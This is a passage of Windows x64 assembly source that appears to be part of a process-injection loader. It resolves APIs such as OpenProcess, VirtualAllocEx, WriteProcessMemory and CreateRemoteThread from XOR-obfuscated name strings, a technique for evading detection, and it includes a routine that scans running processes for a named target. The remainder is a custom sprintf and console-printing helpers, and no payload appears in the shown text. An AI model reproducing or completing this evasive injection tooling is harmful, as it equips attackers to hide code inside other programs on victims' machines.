    mov [get_current_process], rax              ; GetCurrentProcess addr

    mov rcx, [rbp + 16]
    mov rdx, get_std_handle_xor
    mov r8, get_std_handle_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_std_handle], rax                   ; GetStdHandle addr

    mov rcx, [rbp + 16]
    mov rdx, open_file_xor
    mov r8, open_file_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [open_file], rax                        ; OpenFile addr
 
    mov rcx, [rbp + 16]
    mov rdx, get_file_size_xor
    mov r8, get_file_size_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_file_size], rax                    ; GetFileSize addr
 
    mov rcx, [rbp + 16]
    mov rdx, open_process_xor
    mov r8, open_process_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [open_process], rax                     ; OpenProcess addr

    mov rcx, [rbp + 16]
    mov rdx, create_file_a_xor
    mov r8, create_file_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_file_a], rax                    ; CreateFileA addr

    mov rcx, [rbp + 16]
    mov rdx, create_file_w_xor
    mov r8, create_file_w_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_file_w], rax                    ; CreateFileW addr

    mov rcx, [rbp + 16]
    mov rdx, read_file_xor
    mov r8, read_file_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [read_file], rax                        ; ReadFile addr

    mov rcx, [rbp + 16]
    mov rdx, set_file_pointer_xor
    mov r8, set_file_pointer_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [set_file_pointer], rax                 ; SetFilePointer addr

    mov rcx, [rbp + 16]
    mov rdx, find_first_stream_w_xor
    mov r8, find_first_stream_w_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [find_first_stream_w], rax              ; FindFirstStreamW addr

    mov rcx, [rbp + 16]
    mov rdx, find_next_stream_w_xor
    mov r8, find_next_stream_w_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [find_next_stream_w], rax               ; FindNextStreamW addr

    mov rcx, [rbp + 16]
    mov rdx, find_close_xor
    mov r8, find_close_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [find_close], rax                       ; FindClose addr

    mov rcx, [rbp + 16]
    mov rdx, write_file_xor
    mov r8, write_file_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_file], rax                       ; WriteFile addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_alloc_xor
    mov r8, virtual_alloc_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc], rax                    ; VirtualAlloc addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_alloc_ex_xor
    mov r8, virtual_alloc_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc_ex], rax                 ; VirtualAllocEx addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_free_xor
    mov r8, virtual_free_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_free], rax                     ; VirtualFree addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_free_ex_xor
    mov r8, virtual_free_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_free_ex], rax                  ; VirtualFreeEx addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_protect_xor
    mov r8, virtual_protect_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect], rax                  ; VirtualProtect addr

    mov rcx, [rbp + 16]
    mov rdx, virtual_protect_ex_xor
    mov r8, virtual_protect_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect_ex], rax               ; VirtualProtectEx addr

    mov rcx, [rbp + 16]
    mov rdx, read_process_memory_xor
    mov r8, read_process_memory_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [read_process_memory], rax              ; ReadProcessMemory addr

    mov rcx, [rbp + 16]
    mov rdx, write_process_memory_xor
    mov r8, write_process_memory_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_process_memory], rax             ; WriteProcessMemory addr

    mov rcx, [rbp + 16]
    mov rdx, create_remote_thread_xor
    mov r8, create_remote_thread_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_remote_thread], rax             ; CreateRemoteThread addr
     
    mov rcx, [rbp + 16]
    mov rdx, wait_for_single_object_xor
    mov r8, wait_for_single_object_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [wait_for_single_object], rax           ; WaitForSingleObject addr
 
    mov rcx, [rbp + 16]
    mov rdx, close_handle_xor
    mov r8, close_handle_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [close_handle], rax                     ; CloseHandle addr

    mov rcx, [rbp + 16]
    mov rdx, create_toolhelp32_snapshot_xor
    mov r8, create_toolhelp32_snapshot_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_toolhelp32_snapshot], rax       ; CreateToolhelp32Snapshot addr

    mov rcx, [rbp + 16]
    mov rdx, process32_first_xor
    mov r8, process32_first_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_first], rax                  ; Process32First addr

    mov rcx, [rbp + 16]
    mov rdx, process32_next_xor
    mov r8, process32_next_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [process32_next], rax                   ;  Process32Next addr

    mov rcx, [rbp + 16]
    mov rdx, sleep_xor
    mov r8, sleep_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [sleep], rax                            ; Sleep addr

    mov rcx, [rbp + 16]
    mov rdx, output_debug_string_a_xor
    mov r8, output_debug_string_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [output_debug_string_a], rax            ; OutputDebugStringA addr

.shutdown:

    leave
    ret

; arg0: proc name       rcx
;
; return: proc id       rax
find_target_process_id:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; proc name

    ; [rbp - 8] = return value
    ; [rbp - 16] = snapshot handle
    ; [rbp - 304] = process entry struct
    sub rsp, 304                            ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov qword [rbp - 8], 0                  ; return value

    mov rcx, TH32CS_SNAPPROCESS
    xor rdx, rdx
    call [create_toolhelp32_snapshot]       ; snapshot handle

    cmp rax, INVALID_HANDLE_VALUE
    je .shutdown

    mov [rbp - 16], rax                     ; snapshot handle
    mov dword [rbp - 304], 304              ; processentry32.dwsize

    mov rcx, [rbp - 16]                     ; snapshot handle
    mov rdx, rbp
    sub rdx, 304                            ; &processentry 
    call [process32_first]

    cmp rax, 0                              ; if !process32First
    je .shutdown

.loop:
    mov rcx, [rbp - 16]                     ; snapshot handle
    mov rdx, rbp
    sub rdx, 304                            ; &processentry 
    call [process32_next]

    cmp rax, 0
    je .loop_end
        mov rcx, [rbp + 16]
        mov rdx, rbp
        sub rdx, 304
        add rdx, 44
        call strcmpiAA

        cmp rax, 1                          ; are strings equal
        je .process_found        

        jmp .loop

.process_found:
    mov rax, rbp
    sub rax, 304
    add rax, 8 

    mov eax, [rax]
    mov [rbp - 8], rax                      ; return value
.loop_end:

.shutdown:
    mov rax, [rbp - 8]                      ; return value

    leave
    ret

; arg0: ptr to buffer               rcx
; arg1: ptr to str                  rdx
; arg2 ...: args to sprintf         r8, r9, rbp + 48 ..... 
; format specifiers: %(s/d/x)(b/w/d/q)
; s/d/x: string, decimal, hex
; b/w/d/q: byte, word, dword, qword value
sprintf:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; ptr to buffer
    mov [rbp + 24], rdx                     ; ptr to str
    mov [rbp + 32], r8                      ; arg1 to buffer
    mov [rbp + 40], r9                      ; arg2 to buffer

    ; rbp - 8 = return value
    ; rbp - 16 = esi
    ; rbp - 24 = edi
    ; rbp - 32 = place holder count
    ; rbp - 40 = offset from rbp
    ; rbp - 48 = number of bits to shift right
    ; rbp - 56 = rbx
    ; rbp - 64 = quotient from print decimal division
    ; rbp - 88 = temp buffer for decimal conversion (20 digit) + 5 byte padding
    ; rbp - 96 = arg size (db, xb = 1, dw, xw = 2, dd, xd = 4, dq, xq = 8), used to point to the next arg by adding to offset from rbp, currently passing 8 for all to keep OutputDebugStringA from crashing !?!?
    sub rsp, 96                             ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov qword [rbp - 8], 0                  ; return value
    mov [rbp - 16], rsi                     ; save rsi
    mov [rbp - 24], rdi                     ; save rdi
    mov qword [rbp - 32], 0                 ; place holder count
    mov qword [rbp - 56], rbx               ; save rbx

    mov qword [rbp - 40], 32                ; offset from rbp

    mov rsi, [rbp + 24]                     ; ptr to str
    mov rdi, [rbp + 16]                     ; ptr to buffer

.loop:
    lodsb

    cmp al, '%'
    je .process_placeholder

    stosb

    cmp al, 0
    je .end_of_loop

    jmp .loop
    .process_placeholder:
        lodsb

        cmp al, 's'
        je .print_string

        cmp al, 'd'
        je .print_decimal

        cmp al, 'x'
        je .print_hex

        stosb                               ; not a placeholder, must be a string, copy it

        jmp .loop

        .print_string:
            lodsb
            
            cmp al, 'b'
            je .print_single_byte_char

            cmp al, 'w'
            je .print_double_byte_char

            jmp .loop

            .print_single_byte_char:
                ; copy arg string to the buffer
                mov rax, [rbp - 40]             ; offset from rbp
                mov rcx, [rbp + rax]
                mov rdx, rdi
                call strcpy

                ; find strlen to get rdi to the end of the str in buffer
                mov rax, [rbp - 40]             ; offset from rbp
                mov rcx, [rbp + rax]            ; arg
                call strlen

                add rdi, rax

                add qword [rbp - 40], 8         ; offset from rbp
                inc qword [rbp - 32]            ; place holder count
                jmp .loop

            .print_double_byte_char:
                ; copy arg string to the buffer
                mov rax, [rbp - 40]             ; offset from rbp
                mov rcx, [rbp + rax]
                mov rdx, rdi
                call wstrcpya

                ; find strlen to get rdi to the end of the str in buffer
                mov rax, [rbp - 40]             ; offset from rbp
                mov rcx, [rbp + rax]            ; arg
                call wstrlen

                add rdi, rax

                add qword [rbp - 40], 8         ; offset from rbp, ideally should be arg size [rbp - 96]
                inc qword [rbp - 32]            ; place holder count
                jmp .loop

        .print_decimal:
            lodsb
            
            cmp al, 'b'
            je .print_decimal_byte

            cmp al, 'w'
            je .print_decimal_word

            cmp al, 'd'
            je .print_decimal_dword

            cmp al, 'q'
            je .print_decimal_qword

            jmp .loop

            .print_decimal_byte:
                mov rax, [rbp - 40]         ; offset from rbp
                movzx eax, byte [rbp + rax] ; arg
                mov qword [rbp - 96], 1     ; arg size
                jmp .continue_from_decimal_data_size_check
            .print_decimal_word:
                mov rax, [rbp - 40]         ; offset from rbp
                movzx eax, word [rbp + rax] ; arg
                mov qword [rbp - 96], 2     ; arg size
                jmp .continue_from_decimal_data_size_check
            .print_decimal_dword:
                mov rax, [rbp - 40]         ; offset from rbp
                mov eax, [rbp + rax]        ; arg
                mov qword [rbp - 96], 4     ; arg size
                jmp .continue_from_decimal_data_size_check
            .print_decimal_qword:
                mov rax, [rbp - 40]         ; offset from rbp
                mov rax, [rbp + rax]        ; arg
                mov qword [rbp - 96], 8     ; arg size
                jmp .continue_from_decimal_data_size_check

            .continue_from_decimal_data_size_check:

            mov rcx, 10                     ; divisor
            xor rbx, rbx                    ; number of digits in the decimal

            mov r10, rsi                    ; temp save rsi
            mov r11, rdi                    ; temp save rdi

            mov rdi, rbp
            sub rdi, 65                     ; temp buffer for digits (reverse)
            std                             ; set direction flag since the digits are written in reverse order

            .print_decimal_loop:
                xor edx, edx
                div rcx

                mov [rbp - 64], rax         ; save quotient
                mov rax, rdx                ; remainder
                add rax, 48                 ; ascii value of integer

                stosb

                mov rax, [rbp - 64]         ; restore quotient

                inc rbx
                cmp rax, 0
                jne .print_decimal_loop

            mov rdi, r11                    ; temp restore rdi

            cld                             ; clear direction flag

            mov rsi, rbp
            sub rsi, 64                     ; temp buffer for digits (reverse)
            sub rsi, rbx

            .final_copy_loop:
                movsb

                dec rbx
                jnz .final_copy_loop

            mov rsi, r10                    ; temp restore rsi
            inc qword [rbp - 32]            ; place holder count
            add qword [rbp - 40], 8         ; offset from rbp, ideally should be arg size [rbp - 96]
            jmp .loop

        .print_hex:
            lodsb

            cmp al, 'b'
            je .print_hex_byte

            cmp al, 'w'
            je .print_hex_word

            cmp al, 'd'
            je .print_hex_dword

            cmp al, 'q'
            je .print_hex_qword

            jmp .loop

            .print_hex_byte:
                mov qword [rbp - 48], 8     ; start with 8 bits to shift right
                mov qword [rbp - 96], 1     ; arg size
                jmp .continue_from_hex_data_size_check
            .print_hex_word:
                mov qword [rbp - 48], 16    ; start with 16 bits to shift right
                mov qword [rbp - 96], 2     ; arg size
                jmp .continue_from_hex_data_size_check
            .print_hex_dword:
                mov qword [rbp - 48], 32    ; start with 32 bits to shift right
                mov qword [rbp - 96], 4     ; arg size
                jmp .continue_from_hex_data_size_check
            .print_hex_qword:
                mov qword [rbp - 48], 64    ; start with 64 bits to shift right
                mov qword [rbp - 96], 8     ; arg size
                jmp .continue_from_hex_data_size_check

            .continue_from_hex_data_size_check:

            mov rdx, hex_digits

            .print_hex_loop:
                cmp qword [rbp - 96], 1     ; arg size
                je .copy_byte

                cmp qword [rbp - 96], 2     ; arg size
                je .copy_word

                cmp qword [rbp - 96], 4     ; arg size
                je .copy_dword

                cmp qword [rbp - 96], 8     ; arg size
                je .copy_qword

                .copy_byte:
                    mov rax, [rbp - 40]         ; offset from rbp
                    movzx eax, byte [rbp + rax] ; arg
                    jmp .continue_from_copy

                .copy_word:
                    mov rax, [rbp - 40]         ; offset from rbp
                    movzx eax, word [rbp + rax] ; arg
                    jmp .continue_from_copy

                .copy_dword:
                    mov rax, [rbp - 40]         ; offset from rbp
                    mov eax, [rbp + rax]        ; arg
                    jmp .continue_from_copy

                .copy_qword:
                    mov rax, [rbp - 40]         ; offset from rbp
                    mov rax, [rbp + rax]        ; arg
                    jmp .continue_from_copy
                
                .continue_from_copy:

                    sub qword [rbp - 48], 4     ; nbits to shift right
                    mov rcx, [rbp - 48]         ; nbits to shift right

                    shr rax, cl                 ; shift right and 'and', so just the nibble is left in al
                    and al, 0x0f

                    movzx ebx, byte al
                    mov al, [rdx + rbx]         ; the corresponding 'letter' in al

                    stosb

                    cmp qword [rbp - 48], 0     ; nbits to shift right
                    jne .print_hex_loop

            inc qword [rbp - 32]                ; place holder count
            add qword [rbp - 40], 8             ; offset from rbp, ideally should be arg size [rbp - 96]
            jmp .loop

.end_of_loop:

.shutdown:
    mov rbx, [rbp - 56]                     ; restore rbx
    mov rdi, [rbp - 24]                     ; restore rdi
    mov rsi, [rbp - 16]                     ; restore rsi
    mov rax, [rbp - 8]                      ; restore rax

    leave
    ret

; arg0: handle              rcx
; arg0: ptr to str          rdx
print_string:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; handle
    mov [rbp + 24], rdx                     ; ptr to str

    ; rbp - 8 = return value
    ; rbp - 16 = 8 bytes padding
    sub rsp, 16                             ; allocate local variable space
    sub rsp, 48                             ; allocate shadow space, extra args, padding bytes

    mov qword [rbp - 8], 0                  ; return value

    ; calculate str len
    mov rcx, [rbp + 24]                     ; ptr to str
    call strlen

    mov rcx, [rbp + 16]                     ; std handle
    mov rdx, [rbp + 24]                     ; ptr to str
    mov r8, rax                             ; str len
    xor r9, r9
    mov qword [rsp + 32], 0
    call [write_file]

.shutdown:

    mov rax, [rbp - 8]                      ; return value

    leave
    ret

; arg0: ptr to str      rcx
print_console:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; ptr to str

    ; rbp - 8 = return value
    ; rbp - 16 = 8 bytes padding
    ; rbp - 24 = strlen
    ; rbp - 32 = std handle
    sub rsp, 32                             ; allocate local variable space
    sub rsp, 48                             ; allocate shadow space, extra args, padding bytes

    mov qword [rbp - 8], 0                  ; return value

    ; calculate str len
    mov rcx, [rbp + 16]                     ; ptr to str
    call strlen
    mov [rbp - 24], rax                     ; strlen

    mov rcx, STD_HANDLE_ENUM
    call [get_std_handle]

    mov [rbp - 32], rax                     ; std handle

    mov rcx, [rbp - 32]                     ; std handle
    mov rdx, [rbp + 16]                     ; ptr to str
    mov r8, [rbp - 24]                      ; str len
    xor r9, r9
    mov qword [rsp + 32], 0
    call [write_file]

.shutdown:

    mov rax, [rbp - 8]                      ; return value

    leave
    ret

